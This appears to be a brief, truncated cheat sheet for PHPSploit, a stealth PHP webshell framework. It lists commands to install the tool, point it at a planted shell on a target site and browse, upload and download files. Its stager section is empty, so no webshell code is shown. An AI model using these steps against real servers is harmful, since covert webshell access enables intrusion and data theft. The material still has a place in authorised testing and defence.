# PHPSploit

Stealth PHP webshell framework — full interactive session tunneled in HTTP headers.

## Quick Start

```bash
pip install phpsploit
phpsploit

# Set target and connect
set TARGET http://target.com/shell.php
set PASSKEY MySecret
exploit
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `set TARGET <url>` | Webshell URL |
| `set PASSKEY <key>` | Obfuscation passkey |
| `exploit` | Connect to shell |
| `ls`, `cd`, `cat` | File system ops |
| `upload <local> <remote>` | Upload file |
| `download <remote>` | Download file |

## Webshell Setup

Minimal PHP stager (upload to target):

```

## Common Workflows
